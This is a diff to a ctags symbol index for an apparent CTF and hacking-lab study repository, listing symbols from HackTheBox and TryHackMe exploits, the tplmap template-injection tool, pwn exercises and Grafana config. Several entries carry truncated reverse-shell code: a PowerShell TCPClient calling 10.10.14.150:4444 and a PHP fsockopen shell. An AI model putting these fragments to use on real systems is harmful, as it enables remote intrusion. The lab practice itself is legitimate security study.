+r4	htb/Remote/Gaining/umbraco_cve3.py	/^r4 = s.post(url_xslt,data=data,headers=headers);$/;"	v
+randint_n	dreamhackctf/login-1/tplmap/utils/rand.py	/^def randint_n(n):$/;"	f
+randints	dreamhackctf/login-1/tplmap/utils/rand.py	/^randints = [$/;"	v
+randomstring	dreamhackctf/login-1/tplmap/tests/env_node_tests/connect-app.js	/^var randomstring = require("randomstring");$/;"	v
+randomword	dreamhackctf/login-1/tplmap/tests/env_py_tests/webserver.py	/^def randomword(length = 8):$/;"	f
+randstr_n	dreamhackctf/login-1/tplmap/utils/rand.py	/^def randstr_n(n, chars=string.letters + string.digits):$/;"	f
+randstrings	dreamhackctf/login-1/tplmap/utils/rand.py	/^randstrings = [$/;"	v
+read	dreamhackctf/login-1/tplmap/core/plugin.py	/^    def read(self, remote_path):$/;"	m	class:Plugin
+read_a	thm/Advent_of_Cyber/Day23/php-reverse-shell.phtml	/^	$read_a = array($sock, $pipes[1], $pipes[2]);$/;"	v
+read_plt	study_hacked/system_tip/book4b_pwn/step5/aslr/aslr.py	/^read_plt = 0x8048330$/;"	v
+recv	study_hacked/system_tip/book4b_pwn/step4/stack-bof/bof3/attack_script_bof3.py	/^	recv = p.recv(2096)$/;"	v
+reflect	dreamhackctf/login-1/tplmap/tests/env_py_tests/webserver.py	/^def reflect(engine):$/;"	f
+reflect_cookieauth	dreamhackctf/login-1/tplmap/tests/env_py_tests/webserver.py	/^def reflect_cookieauth(engine):$/;"	f
+reflection_tests	dreamhackctf/login-1/tplmap/tests/test_java_freemarker.py	/^    reflection_tests = [$/;"	v	class:FreemarkerTest
+reflection_tests	dreamhackctf/login-1/tplmap/tests/test_java_velocity.py	/^    reflection_tests = [$/;"	v	class:VelocityTest
+reflection_tests	dreamhackctf/login-1/tplmap/tests/test_node_dot.py	/^    reflection_tests = [$/;"	v	class:DotTests
+reflection_tests	dreamhackctf/login-1/tplmap/tests/test_node_dust.py	/^    reflection_tests = [$/;"	v	class:DustTests
+reflection_tests	dreamhackctf/login-1/tplmap/tests/test_node_ejs.py	/^    reflection_tests = [$/;"	v	class:EjsTests
+reflection_tests	dreamhackctf/login-1/tplmap/tests/test_node_javascript.py	/^    reflection_tests = [$/;"	v	class:JavascriptTests
+reflection_tests	dreamhackctf/login-1/tplmap/tests/test_node_marko.py	/^    reflection_tests = [$/;"	v	class:MarkoTests
+reflection_tests	dreamhackctf/login-1/tplmap/tests/test_node_nunjucks.py	/^    reflection_tests = [$/;"	v	class:NunjucksTests
+reflection_tests	dreamhackctf/login-1/tplmap/tests/test_node_pug.py	/^    reflection_tests = [$/;"	v	class:PugTest
+reflection_tests	dreamhackctf/login-1/tplmap/tests/test_php_php.py	/^    reflection_tests = [$/;"	v	class:PhpTests
+reflection_tests	dreamhackctf/login-1/tplmap/tests/test_php_smarty_secured.py	/^    reflection_tests = [$/;"	v	class:SmartySecuredTest
+reflection_tests	dreamhackctf/login-1/tplmap/tests/test_php_smarty_unsecured.py	/^    reflection_tests = [$/;"	v	class:SmartyUnsecuredTest
+reflection_tests	dreamhackctf/login-1/tplmap/tests/test_php_twig_secured.py	/^    reflection_tests = [$/;"	v	class:TwigSecuredTest
+reflection_tests	dreamhackctf/login-1/tplmap/tests/test_php_twig_unsecured.py	/^    reflection_tests = [$/;"	v	class:TwigUnsecuredTest
+reflection_tests	dreamhackctf/login-1/tplmap/tests/test_py_jinja2.py	/^    reflection_tests = [$/;"	v	class:Jinja2Test
+reflection_tests	dreamhackctf/login-1/tplmap/tests/test_py_mako.py	/^    reflection_tests = [$/;"	v	class:MakoTest
+reflection_tests	dreamhackctf/login-1/tplmap/tests/test_py_python.py	/^    reflection_tests = [$/;"	v	class:PythonTests
+reflection_tests	dreamhackctf/login-1/tplmap/tests/test_py_tornado.py	/^    reflection_tests = [$/;"	v	class:TornadoTest
+reflection_tests	dreamhackctf/login-1/tplmap/tests/test_ruby_erb.py	/^    reflection_tests = [$/;"	v	class:ErbTests
+reflection_tests	dreamhackctf/login-1/tplmap/tests/test_ruby_ruby.py	/^    reflection_tests = [$/;"	v	class:RubyTests
+reflection_tests	dreamhackctf/login-1/tplmap/tests/test_ruby_slim.py	/^    reflection_tests = [$/;"	v	class:SlimTests
+region	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^region =$/;"	k	section:external_image_storage.s3
+register	dreamhackctf/login-1/app.py	/^def register():$/;"	f
+registerExtenderCallbacks	dreamhackctf/login-1/tplmap/burp_extension/burp_extender.py	/^    def registerExtenderCallbacks( self, callbacks ):$/;"	m	class:BurpExtender
+remote_cache	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^[remote_cache]$/;"	s
+render	dreamhackctf/login-1/tplmap/core/plugin.py	/^    def render(self, code, **kwargs):$/;"	m	class:Plugin
+rendered	dreamhackctf/login-1/tplmap/tests/env_php_tests/eval.php	/^  $rendered = eval($tpl);$/;"	v
+rendered	dreamhackctf/login-1/tplmap/tests/env_php_tests/smarty-3.1.32-secured.php	/^$rendered = $smarty->fetch('string:'.$tpl);$/;"	v
+rendered	dreamhackctf/login-1/tplmap/tests/env_php_tests/smarty-3.1.32-unsecured.php	/^$rendered = $smarty->fetch('string:'.$tpl);$/;"	v
+rendered	dreamhackctf/login-1/tplmap/tests/env_php_tests/twig-1.19.0-unsecured.php	/^$rendered = $twig->render('tpl');$/;"	v
+rendered	dreamhackctf/login-1/tplmap/tests/env_php_tests/twig-1.20.0-secured.php	/^$rendered = $twig->render('tpl');$/;"	v
+rendered_detected	dreamhackctf/login-1/tplmap/core/plugin.py	/^    def rendered_detected(self):$/;"	m	class:Plugin
+rendered_detected	dreamhackctf/login-1/tplmap/plugins/languages/java.py	/^    def rendered_detected(self):$/;"	m	class:Java
+rendering	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^[rendering]$/;"	s
+reporting_enabled	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^reporting_enabled = true$/;"	k	section:analytics
+req	dreamhackctf/login-1/tplmap/burp_extension/channel.py	/^    def req( self, injection ):$/;"	m	class:Channel
+req	dreamhackctf/login-1/tplmap/core/channel.py	/^    def req(self, injection):$/;"	m	class:Channel
+reqUrl	thm/Advent_of_Cyber/Day9/Day9RequestScript.py	/^	reqUrl = "http:\/\/10.10.169.100:3000\/"+res_['next']$/;"	v
+reqUrl	thm/Advent_of_Cyber/Day9/Day9RequestScript.py	/^reqUrl = "http:\/\/10.10.169.100:3000\/f"$/;"	v
+request	dreamhackctf/login-1/tplmap/utils/cliparser.py	/^request = OptionGroup(parser, "Request", "These options have how to connect and where to inject /;"	v
+res	dreamhackctf/login-1/request_.py	/^res = requests.get(url,data={"userid":username,"password":password})$/;"	v
+res	study_hacked/system_tip/book4b_pwn/step4/stack-bof/bof2/attack_script_pwntool.py	/^	res = sock.recv(2096,timeout=1)$/;"	v
+res_	thm/Advent_of_Cyber/Day9/Day9RequestScript.py	/^	res_ =json.loads(r.text)$/;"	v
+result	study_hacked/system_tip/book4b_pwn/step5/aslr/bruteforce.py	/^    result = s.recv(1024).decode('utf-8')$/;"	v
+reverse_shell	dreamhackctf/login-1/tplmap/core/plugin.py	/^    def reverse_shell(self, host, port, shell = "\/bin\/sh"):$/;"	m	class:Plugin
+reverse_shell	dreamhackctf/login-1/tplmap/plugins/languages/bash.py	/^reverse_shell = [$/;"	v
+role_attribute_path	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^role_attribute_path =$/;"	k	section:auth.generic_oauth
+root	ctf-d/Incident_Response/2012-08-27/accounts/passwd	/^root:x:0:0:root:\/root:\/bin\/bash$/;"	u	home:/root	shell:/bin/bash
+root_url	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^root_url = %(protocol)s:\/\/%(domain)s:%(http_port)s\/$/;"	k	section:server
+router_logging	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^router_logging = false$/;"	k	section:server
+s	htb/Remote/Gaining/umbraco_cve1.py	/^s = requests.session()$/;"	v
+s	htb/Remote/Gaining/umbraco_cve2.py	/^s = requests.session()$/;"	v
+s	htb/Remote/Gaining/umbraco_cve3.py	/^s = requests.session()$/;"	v
+s	study_hacked/system_tip/book4b_pwn/step5/aslr/aslr.py	/^s = connect('127.0.0.1', 4000)$/;"	v
+s	study_hacked/system_tip/book4b_pwn/step5/aslr/bruteforce.py	/^    s = connect('127.0.0.1', 4000)$/;"	v
+s	study_hacked/system_tip/book4b_pwn/step5/aslr/leak.py	/^s = connect('127.0.0.1', 4000)$/;"	v
+s	study_hacked/system_tip/pwntools_usage/auto_overflow_exploit.py	/^	s = process(executable="auto_overflow" ,argv=argvs)$/;"	v
+salt	thm/Simple_CTF/46635.py	/^salt = ''$/;"	v
+salt	thm/Simple_CTF/46635.py.bak	/^salt = ''$/;"	v
+sampler_param	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^sampler_param = 1$/;"	k	section:tracing.jaeger
+sampler_type	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^sampler_type = const$/;"	k	section:tracing.jaeger
+scanned_directory	dreamhackctf/php-1/list.php	/^    $scanned_directory = array_diff(scandir($directory), array('..', '.', 'index.html'));$/;"	v
+scopes	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^scopes = api$/;"	k	section:auth.gitlab
+scopes	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^scopes = https:\/\/www.googleapis.com\/auth\/userinfo.profile https:\/\/www.googleapis.com\/auth/;"	k	section:auth.google
+scopes	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^scopes = user:email$/;"	k	section:auth.generic_oauth
+scopes	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^scopes = user:email$/;"	k	section:auth.grafana_com
+scopes	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^scopes = user:email$/;"	k	section:auth.grafananet
+scopes	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^scopes = user:email,read:org$/;"	k	section:auth.github
+secret	study_hacked/system_tip/book4b_pwn/step4/fsb/fsb.c	/^int secret = 0x12345678;$/;"	v	typeref:typename:int
+secret	study_hacked/system_tip/format_string_example/fsb.c	/^int secret = 0x12345678;$/;"	v	typeref:typename:int
+secret_key	dreamhackctf/login-1/test.py	/^        secret_key = os.urandom(32).hex()$/;"	v
+secret_key	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^secret_key = SW2YcwTIb9zpOOhoPsMm$/;"	k	section:security
+secret_key	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^secret_key =$/;"	k	section:external_image_storage.s3
+security	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^[security]$/;"	s
+select_nc	thm/The_Cod_Caper/linpeas.sh	/^select_nc (){$/;"	f
+send_user_header	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^send_user_header = false$/;"	k	section:dataproxy
+sendback	htb/Remote/mini-reverse.ps1	/^$client = New-Object System.Net.Sockets.TCPClient('10.10.14.150',4444);$stream = $client.GetStre/;"	v
+sendback2	htb/Remote/mini-reverse.ps1	/^$client = New-Object System.Net.Sockets.TCPClient('10.10.14.150',4444);$stream = $client.GetStre/;"	v
+sendbyte	htb/Remote/mini-reverse.ps1	/^$client = New-Object System.Net.Sockets.TCPClient('10.10.14.150',4444);$stream = $client.GetStre/;"	v
+serve_from_sub_path	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^serve_from_sub_path = false$/;"	k	section:server
+server	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^[server]$/;"	s
+server_cert_name	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^server_cert_name =$/;"	k	section:database
+server_url	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^server_url =$/;"	k	section:rendering
+session	dreamhackctf/login-1/request_.py	/^session = requests.Session()$/;"	v
+session	thm/Simple_CTF/46635.py	/^session = requests.Session()$/;"	v
+session	thm/Simple_CTF/46635.py.bak	/^session = requests.Session()$/;"	v
+set	dreamhackctf/login-1/tplmap/core/plugin.py	/^    def set(self, key, value):$/;"	m	class:Plugin
+set_actions	dreamhackctf/login-1/tplmap/core/plugin.py	/^    def set_actions(self, actions):$/;"	m	class:Plugin
+set_contexts	dreamhackctf/login-1/tplmap/core/plugin.py	/^    def set_contexts(self, contexts):$/;"	m	class:Plugin
+setebx	study_hacked/system_tip/book4b_pwn/step5/shellcode/binsh.s	/^setebx:$/;"	l
+setebx	study_hacked/system_tip/book4b_pwn/step5/shellcode/binsh2.s	/^setebx:$/;"	l
+setebx	study_hacked/system_tip/book4b_pwn/step5/shellcode/binsh3.s	/^setebx:$/;"	l
+shell	thm/Advent_of_Cyber/Day23/php-reverse-shell.phtml	/^$shell = 'uname -a; w; id; \/bin\/sh -i';$/;"	v
+shutdown	dreamhackctf/login-1/tplmap/tests/env_py_tests/webserver.py	/^def shutdown():$/;"	f
+shutdown_server	dreamhackctf/login-1/tplmap/tests/env_py_tests/webserver.py	/^def shutdown_server():$/;"	f
+signout_redirect_url	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^signout_redirect_url =$/;"	k	section:auth
+skip_verify	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^skip_verify = false$/;"	k	section:smtp
+sm	htb/Remote/mini-reverse.ps1	/^$sm=(New-Object Net.Sockets.TCPClient('10.10.14.150',4444)).GetStream();[byte[]]$bt=0..65535|%{0/;"	v
+smarty	dreamhackctf/login-1/tplmap/tests/env_php_tests/smarty-3.1.32-secured.php	/^$smarty = new Smarty;$/;"	v
+smarty	dreamhackctf/login-1/tplmap/tests/env_php_tests/smarty-3.1.32-unsecured.php	/^$smarty = new SmartyBC;$/;"	v
+smtp	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^[smtp]$/;"	s
+snapshot_remove_expired	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^snapshot_remove_expired = true$/;"	k	section:snapshots
+snapshots	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^[snapshots]$/;"	s
+sock	study_hacked/system_tip/book4b_pwn/step4/stack-bof/bof2/attack_script_pwntool.py	/^	sock = remote("127.0.0.1",1337)$/;"	v
+sock	thm/Advent_of_Cyber/Day23/php-reverse-shell.phtml	/^$sock = fsockopen($ip, $port, $errno, $errstr, 30);$/;"	v
+socket	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^socket = \/tmp\/grafana.sock$/;"	k	section:server
+soup	dreamhackctf/login-1/curlRequest.py	/^		soup = BeautifulSoup(r, "html.parser")$/;"	v
+soup	htb/Remote/Gaining/umbraco_cve1.py	/^soup = BeautifulSoup(r3.text, 'html.parser');$/;"	v
+soup	htb/Remote/Gaining/umbraco_cve1.py	/^soup = BeautifulSoup(r4.text, 'html.parser');$/;"	v
+soup	htb/Remote/Gaining/umbraco_cve2.py	/^soup = BeautifulSoup(r3.text, 'html.parser');$/;"	v
+soup	htb/Remote/Gaining/umbraco_cve2.py	/^soup = BeautifulSoup(r4.text, 'html.parser');$/;"	v
+soup	htb/Remote/Gaining/umbraco_cve3.py	/^soup = BeautifulSoup(r3.text, 'html.parser');$/;"	v
+soup	htb/Remote/Gaining/umbraco_cve3.py	/^soup = BeautifulSoup(r4.text, 'html.parser');$/;"	v
+sshd	ctf-d/Incident_Response/2012-08-27/accounts/passwd	/^sshd:x:102:65534::\/var\/run\/sshd:\/usr\/sbin\/nologin$/;"	u	home:/var/run/sshd	shell:/usr/sbin/nologin
+ssl_mode	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^ssl_mode = disable$/;"	k	section:database
+st	htb/Remote/mini-reverse.ps1	/^$sm=(New-Object Net.Sockets.TCPClient('10.10.14.150',4444)).GetStream();[byte[]]$bt=0..65535|%{0/;"	v
+startswithtest	dreamhackctf/login-1/tplmap/tests/env_py_tests/webserver.py	/^def startswithtest(engine):$/;"	f
+static_root_path	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^static_root_path = public$/;"	k	section:server
+status	ctf-d/Incident_Response/2012-08-27/weblog/analysus.py	/^	status = Counter(total_word)$/;"	v
+stream	htb/Remote/mini-reverse.ps1	/^$client = New-Object System.Net.Sockets.TCPClient('10.10.14.150',4444);$stream = $client.GetStre/;"	v
+stream_handler	dreamhackctf/login-1/tplmap/utils/loggers.py	/^stream_handler = logging.StreamHandler(stream=sys.stdout)$/;"	v
+strict_transport_security	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^strict_transport_security = false$/;"	k	section:security
+strict_transport_security_max_age_seconds	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^strict_transport_security_max_age_seconds = 86400$/;"	k	section:security
+strict_transport_security_preload	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^strict_transport_security_preload = false$/;"	k	section:security
+strict_transport_security_subdomains	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^strict_transport_security_subdomains = false$/;"	k	section:security
+string	dreamhackctf/login-1/tplmap/utils/closures.py	/^string = [ '"1"' ]$/;"	v
+su_brute_user_num	thm/The_Cod_Caper/linpeas.sh	/^su_brute_user_num (){$/;"	f
+su_try_pwd	thm/The_Cod_Caper/linpeas.sh	/^su_try_pwd (){$/;"	f
+sync	ctf-d/Incident_Response/2012-08-27/accounts/passwd	/^sync:x:4:65534:sync:\/bin:\/bin\/sync$/;"	u	home:/bin	shell:/bin/sync
+sync_cron	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^sync_cron = "0 0 1 * * *"$/;"	k	section:auth.ldap
+sync_ttl	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^sync_ttl = 60$/;"	k	section:auth.proxy
+sys	ctf-d/Incident_Response/2012-08-27/accounts/passwd	/^sys:x:3:3:sys:\/dev:\/bin\/sh$/;"	u	home:/dev	shell:/bin/sh
+syslog	ctf-d/Incident_Response/2012-08-27/accounts/passwd	/^syslog:x:101:103::\/home\/syslog:\/bin\/false$/;"	u	home:/home/syslog	shell:/bin/false
+system_addr	study_hacked/system_tip/book4b_pwn/step5/aslr/aslr.py	/^system_addr = libc_base + system_rel$/;"	v
+system_rel	study_hacked/system_tip/book4b_pwn/step5/aslr/aslr.py	/^system_rel = 0x40190$/;"	v
+tag	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^tag =$/;"	k	section:log.syslog
+target	dreamhackctf/login-1/tplmap/utils/cliparser.py	/^target = OptionGroup(parser, "Target", "These options have to be provided, to define the target /;"	v
+target File : bof2	study_hacked/system_tip/book4b_pwn/step4/stack-bof/bof2/README.md	/^# target File : bof2$/;"	c
+tcp_port_scan	thm/The_Cod_Caper/linpeas.sh	/^tcp_port_scan (){$/;"	f
+tcp_recon	thm/The_Cod_Caper/linpeas.sh	/^tcp_recon (){$/;"	f
+team_ids	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^team_ids =$/;"	k	section:auth.generic_oauth
+team_ids	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^team_ids =$/;"	k	section:auth.github
+temp_data_lifetime	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^temp_data_lifetime = 24h$/;"	k	section:paths
+temp_password	thm/Simple_CTF/46635.py	/^temp_password = ""$/;"	v
+temp_password	thm/Simple_CTF/46635.py.bak	/^temp_password = ""$/;"	v
+templates_pattern	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^templates_pattern = emails\/*.html$/;"	k	section:emails
+test_auth_reflection	dreamhackctf/login-1/tplmap/tests/test_channel.py	/^    def test_auth_reflection(self):$/;"	m	class:ChannelTest
+test_blind	dreamhackctf/login-1/tplmap/tests/basetest.py	/^    def test_blind(self):$/;"	m	class:BaseTest
+test_custom_injection_tag	dreamhackctf/login-1/tplmap/tests/test_channel.py	/^    def test_custom_injection_tag(self):$/;"	m	class:ChannelTest
+test_custom_injection_tag	dreamhackctf/login-1/tplmap/tests/test_java_velocity.py	/^    def test_custom_injection_tag(self):$/;"	m	class:VelocityTest
+test_custom_injection_tag	dreamhackctf/login-1/tplmap/tests/test_node_javascript.py	/^    def test_custom_injection_tag(self):$/;"	m	class:JavascriptTests
+test_custom_injection_tag	dreamhackctf/login-1/tplmap/tests/test_php_smarty_secured.py	/^    def test_custom_injection_tag(self):$/;"	m	class:SmartySecuredTest
+test_custom_injection_tag	dreamhackctf/login-1/tplmap/tests/test_php_smarty_unsecured.py	/^    def test_custom_injection_tag(self):$/;"	m	class:SmartyUnsecuredTest
+test_detection	dreamhackctf/login-1/tplmap/tests/basetest.py	/^    def test_detection(self):$/;"	m	class:BaseTest
+test_download	dreamhackctf/login-1/tplmap/tests/basetest.py	/^    def test_download(self):$/;"	m	class:BaseTest
+test_download	dreamhackctf/login-1/tplmap/tests/test_node_dust.py	/^    def test_download(self):$/;"	m	class:DustTests
+test_download	dreamhackctf/login-1/tplmap/tests/test_php_php.py	/^    def test_download(self):$/;"	m	class:PhpTests
+test_download	dreamhackctf/login-1/tplmap/tests/test_php_smarty_secured.py	/^    def test_download(self):$/;"	m	class:SmartySecuredTest
+test_download	dreamhackctf/login-1/tplmap/tests/test_php_smarty_unsecured.py	/^    def test_download(self):$/;"	m	class:SmartyUnsecuredTest
+test_download	dreamhackctf/login-1/tplmap/tests/test_php_twig_secured.py	/^    def test_download(self):$/;"	m	class:TwigSecuredTest
+test_header_reflection	dreamhackctf/login-1/tplmap/tests/test_channel.py	/^    def test_header_reflection(self):$/;"	m	class:ChannelTest
+test_no_reflection	dreamhackctf/login-1/tplmap/tests/test_channel.py	/^    def test_no_reflection(self):$/;"	m	class:ChannelTest
+test_post_reflection	dreamhackctf/login-1/tplmap/tests/test_channel.py	/^    def test_post_reflection(self):$/;"	m	class:ChannelTest
+test_put_reflection	dreamhackctf/login-1/tplmap/tests/test_channel.py	/^    def test_put_reflection(self):$/;"	m	class:ChannelTest
+test_quotes	dreamhackctf/login-1/tplmap/tests/test_channel.py	/^    def test_quotes(self):$/;"	m	class:ChannelTest
+test_reflection	dreamhackctf/login-1/tplmap/tests/basetest.py	/^    def test_reflection(self):$/;"	m	class:BaseTest
+test_reflection_limit	dreamhackctf/login-1/tplmap/tests/test_py_jinja2.py	/^    def test_reflection_limit(self):$/;"	m	class:Jinja2Test
+test_reflection_limit	dreamhackctf/login-1/tplmap/tests/test_py_mako.py	/^    def test_reflection_limit(self):$/;"	m	class:MakoTest
+test_reflection_multiple_point_no_tag	dreamhackctf/login-1/tplmap/tests/test_channel.py	/^    def test_reflection_multiple_point_no_tag(self):$/;"	m	class:ChannelTest
+test_reflection_multiple_point_tag	dreamhackctf/login-1/tplmap/tests/test_channel.py	/^    def test_reflection_multiple_point_tag(self):$/;"	m	class:ChannelTest
+test_reflection_point_dont_startswith	dreamhackctf/login-1/tplmap/tests/test_channel.py	/^    def test_reflection_point_dont_startswith(self):$/;"	m	class:ChannelTest
+test_reflection_point_startswith	dreamhackctf/login-1/tplmap/tests/test_channel.py	/^    def test_reflection_point_startswith(self):$/;"	m	class:ChannelTest
+test_reflection_quotes	dreamhackctf/login-1/tplmap/tests/test_node_pug.py	/^    def test_reflection_quotes(self):$/;"	m	class:PugTest
+test_upload	dreamhackctf/login-1/tplmap/tests/basetest.py	/^    def test_upload(self):$/;"	m	class:BaseTest
+test_upload	dreamhackctf/login-1/tplmap/tests/test_node_dust.py	/^    def test_upload(self):$/;"	m	class:DustTests
+test_upload	dreamhackctf/login-1/tplmap/tests/test_php_smarty_secured.py	/^    def test_upload(self):$/;"	m	class:SmartySecuredTest
+test_upload	dreamhackctf/login-1/tplmap/tests/test_php_twig_secured.py	/^    def test_upload(self):$/;"	m	class:TwigSecuredTest
+test_upload_blind	dreamhackctf/login-1/tplmap/tests/basetest.py	/^    def test_upload_blind(self):$/;"	m	class:BaseTest
+test_upload_blind	dreamhackctf/login-1/tplmap/tests/test_php_smarty_secured.py	/^    def test_upload_blind(self):$/;"	m	class:SmartySecuredTest
+test_upload_blind	dreamhackctf/login-1/tplmap/tests/test_php_twig_secured.py	/^    def test_upload_blind(self):$/;"	m	class:TwigSecuredTest
+test_url_reflection	dreamhackctf/login-1/tplmap/tests/test_channel.py	/^    def test_url_reflection(self):$/;"	m	class:ChannelTest
+test_wrong_auth_reflection	dreamhackctf/login-1/tplmap/tests/test_channel.py	/^    def test_wrong_auth_reflection(self):$/;"	m	class:ChannelTest
+time_based_blind_delay	dreamhackctf/login-1/tplmap/utils/config.py	/^time_based_blind_delay = config["time_based_blind_delay"]$/;"	v
+timeout	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^timeout = 30$/;"	k	section:dataproxy
+tls_client_ca	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^tls_client_ca =$/;"	k	section:auth.generic_oauth
+tls_client_cert	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^tls_client_cert =$/;"	k	section:auth.generic_oauth
+tls_client_key	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^tls_client_key =$/;"	k	section:auth.generic_oauth
+tls_skip_verify_insecure	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^tls_skip_verify_insecure = false$/;"	k	section:auth.generic_oauth
+token_rotation_interval_minutes	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^token_rotation_interval_minutes = 10$/;"	k	section:auth
+token_url	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^token_url = https:\/\/accounts.google.com\/o\/oauth2\/token$/;"	k	section:auth.google
+token_url	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^token_url = https:\/\/github.com\/login\/oauth\/access_token$/;"	k	section:auth.github
+token_url	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^token_url = https:\/\/gitlab.com\/oauth\/token$/;"	k	section:auth.gitlab
+token_url	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^token_url =$/;"	k	section:auth.generic_oauth
+total_word	ctf-d/Incident_Response/2012-08-27/weblog/analysus.py	/^	total_word = [x for x in read]$/;"	v
+tpl	dreamhackctf/login-1/tplmap/tests/env_php_tests/eval.php	/^  $tpl=$inj;$/;"	v
+tpl	dreamhackctf/login-1/tplmap/tests/env_php_tests/eval.php	/^  $tpl=str_replace("%s", $inj, $_GET["tpl"]);$/;"	v
+tpl	dreamhackctf/login-1/tplmap/tests/env_php_tests/smarty-3.1.32-secured.php	/^  $tpl=$inj;$/;"	v
+tpl	dreamhackctf/login-1/tplmap/tests/env_php_tests/smarty-3.1.32-secured.php	/^  $tpl=str_replace("%s", $inj, $_GET["tpl"]);$/;"	v
+tpl	dreamhackctf/login-1/tplmap/tests/env_php_tests/smarty-3.1.32-unsecured.php	/^  $tpl=$inj;$/;"	v
+tpl	dreamhackctf/login-1/tplmap/tests/env_php_tests/smarty-3.1.32-unsecured.php	/^  $tpl=str_replace("%s", $inj, $_GET["tpl"]);$/;"	v
+tpl	dreamhackctf/login-1/tplmap/tests/env_php_tests/twig-1.19.0-unsecured.php	/^  $tpl=$inj;$/;"	v
+tpl	dreamhackctf/login-1/tplmap/tests/env_php_tests/twig-1.19.0-unsecured.php	/^  $tpl=str_replace("%s", $inj, $_GET["tpl"]);$/;"	v
+tpl	dreamhackctf/login-1/tplmap/tests/env_php_tests/twig-1.20.0-secured.php	/^  $tpl=$inj;$/;"	v
+tpl	dreamhackctf/login-1/tplmap/tests/env_php_tests/twig-1.20.0-secured.php	/^  $tpl=str_replace("%s", $inj, $_GET["tpl"]);$/;"	v
+tplcmd	dreamhackctf/login-1/tplmap/utils/cliparser.py	/^tplcmd = OptionGroup(parser, "Template inspection", "These "$/;"	v
+tracing.jaeger	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^[tracing.jaeger]$/;"	s
+true_var	dreamhackctf/login-1/tplmap/utils/closures.py	/^true_var = [ 'true' ]$/;"	v
+twig	dreamhackctf/login-1/tplmap/tests/env_php_tests/twig-1.19.0-unsecured.php	/^$twig = new Twig_Environment($loader);$/;"	v
+twig	dreamhackctf/login-1/tplmap/tests/env_php_tests/twig-1.20.0-secured.php	/^$twig = new Twig_Environment($loader);$/;"	v
+type	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^type = database$/;"	k	section:remote_cache
+type	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^type = sqlite3$/;"	k	section:database
+u	study_hacked/system_tip/book4b_pwn/step5/aslr/aslr.py	/^def u(x):$/;"	f
+u	study_hacked/system_tip/book4b_pwn/step5/aslr/bruteforce.py	/^def u(x):$/;"	f
+u	study_hacked/system_tip/book4b_pwn/step5/aslr/leak.py	/^def u(x):$/;"	f
+update_actions	dreamhackctf/login-1/tplmap/core/plugin.py	/^    def update_actions(self, actions):$/;"	m	class:Plugin
+url	dreamhackctf/login-1/curlRequest.py	/^url = "http:\/\/host1.dreamhack.games:8265\/user\/"$/;"	v
+url	dreamhackctf/login-1/request_.py	/^url = "http:\/\/host1.dreamhack.games:8251\/login"$/;"	v
+url	dreamhackctf/login-1/test.py	/^url = "http:\/\/host1.dreamhack.games:8310\/"$/;"	v
+url	dreamhackctf/login-1/tplmap/tests/env_node_tests/connect-app.js	/^var url = require('url');$/;"	v
+url	dreamhackctf/login-1/tplmap/tests/test_java_freemarker.py	/^    url = 'http:\/\/127.0.0.1:15003\/freemarker?inj=*&tpl=%s'$/;"	v	class:FreemarkerTest
+url	dreamhackctf/login-1/tplmap/tests/test_java_velocity.py	/^    url = 'http:\/\/127.0.0.1:15003\/velocity?inj=*&tpl=%s'$/;"	v	class:VelocityTest
+url	dreamhackctf/login-1/tplmap/tests/test_node_dot.py	/^    url = 'http:\/\/127.0.0.1:15004\/dot?inj=*&tpl=%s'$/;"	v	class:DotTests
+url	dreamhackctf/login-1/tplmap/tests/test_node_dust.py	/^    url = 'http:\/\/127.0.0.1:15004\/dust?inj=*&tpl=%s'$/;"	v	class:DustTests
